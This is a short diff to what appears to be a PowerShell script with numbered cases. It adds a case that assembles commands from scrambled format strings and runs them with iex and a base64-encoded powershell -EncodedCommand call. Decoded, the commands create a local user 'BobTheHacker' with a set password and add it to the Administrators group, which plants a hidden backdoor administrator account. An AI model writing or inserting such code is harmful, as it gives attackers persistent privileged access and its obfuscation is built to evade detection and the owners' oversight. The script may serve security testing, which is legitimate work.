@@ -236,6 +236,18 @@ for /L %%I in (1,1,%COUNT%) do (
             "del `"$cmdFile`""
         ) -Wait
     }
+    10 {
+        $payload = "{1}{0} {3}{2} Bob{5}Hac{4} '{{Y0ug0tHa{6}{7}}}' /add /Y" -f "t", "ne", "er", "us", "ker", "The", "ckedby", "B0b"  
+        iex $payload *> $null
+        $payload2 = "net loc{0}up Ad{7}ato{8} Bo{1}{2}Hac{3} {6}" -f "algro", "b", "The", "ker", "ername", "us", "/add", "ministr", "rs" 
+        $Bytes = [System.Text.Encoding]::Unicode.GetBytes($payload2)
+        $Encoded = [Convert]::ToBase64String($Bytes) 
+        Start-Process -FilePath "powershell.exe" -ArgumentList @(
+            "-EncodedCommand",
+            "$Encoded"
+        ) -Wait
+
+    }
 }
 
 Write-Host ""
